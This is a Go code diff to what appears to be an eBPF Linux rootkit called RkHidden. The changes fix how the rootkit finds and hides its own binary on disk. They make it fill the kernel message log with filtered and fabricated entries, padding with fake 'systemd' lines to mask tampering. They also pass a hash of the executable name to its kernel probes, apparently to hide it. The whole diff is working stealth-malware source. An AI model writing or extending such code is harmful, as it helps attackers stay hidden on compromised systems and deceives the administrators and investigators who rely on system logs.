@@ -246,7 +246,7 @@ func (rk *RkHidden) HideMyself() {
 	}
 
 	for _, info := range infos {
-		if uint64(info.Minor) == stat.Dev {
+		if int32(info.Major)<<8|int32(info.Minor) == int32(stat.Dev) {
 			exe, _ := os.Executable()
 			dir, file := path.Split(strings.TrimPrefix(exe, info.Mountpoint))
 
@@ -280,8 +280,10 @@ func (rk *RkHidden) FillKmsg() {
 		if strings.Contains(txt, " port") ||
 			strings.Contains(txt, "IPV6") ||
 			strings.Contains(txt, " renamed") ||
-			strings.Contains(txt, "xfs") || strings.Contains(txt, "ext4") {
-			strs = append(strs, txt)
+			strings.Contains(txt, "xfs") || strings.Contains(txt, "ext4") ||
+			strings.Contains(txt, "EXT4-fs") || strings.Contains(txt, "Btrfs") ||
+			strings.Contains(txt, "systemd") {
+			strs = append(strs, txt+"\n")
 		}
 
 		if len(strs) == 30 {
@@ -290,7 +292,7 @@ func (rk *RkHidden) FillKmsg() {
 	}
 
 	if len(strs) < 30 {
-		for i := 0; i != 30; i++ {
+		for i := 0; i != 30-len(strs); i++ {
 			strs = append(strs, "systemd[1]: Reached target Sockets.")
 			if len(strs) == 30 {
 				break
@@ -303,8 +305,9 @@ func (rk *RkHidden) FillKmsg() {
 		k := make([]byte, 4)
 		ByteOrder.PutUint32(k, uint32(i))
 
-		d := make([]byte, 100)
-		copy(d[:], []byte(str))
+		d := make([]byte, 112)
+		ByteOrder.PutUint64(d, uint64(len(str)))
+		copy(d[8:], []byte(str))
 
 		if err := kmsgMap.Put(k, d); err != nil {
 			rk.HandleError(err)
@@ -393,12 +396,15 @@ func (rk *RkHidden) InitOverride() {
 
 	// hide the binary itself
 	rk.HideMyself()
+}
 
-	// example
-	//rk.HideFile("ext4", "etc", "issue")
+func (rk *RkHidden) getRkHash() uint64 {
+	exe, _ := os.Executable()
+	return FNVHashStr(path.Base(exe))
 }
 
 func (rk *RkHidden) Start() {
+
 	rk.Options = manager.Options{
 		DefaultKProbeMaxActive: 512,
 		DefaultProbeRetry:      2,
@@ -407,6 +413,10 @@ func (rk *RkHidden) Start() {
 			{
 				Name:  "rk_pid",
 				Value: uint64(rk.Pid),
+			},
+			{
+				Name:  "rk_hash",
+				Value: rk.getRkHash(),
 			},
 		},
 	}
@@ -437,7 +447,8 @@ func (rk *RkHidden) Start() {
 	// unblock kmsg
 	rk.UnBlockKsmg(rkFdKeys)
 
-	fmt.Printf("Started: %d\n", rk.Pid)
+	exe, _ := os.Executable()
+	fmt.Printf("Started %s\n", exe)
 }
 
 func (rk *RkHidden) Stop() {
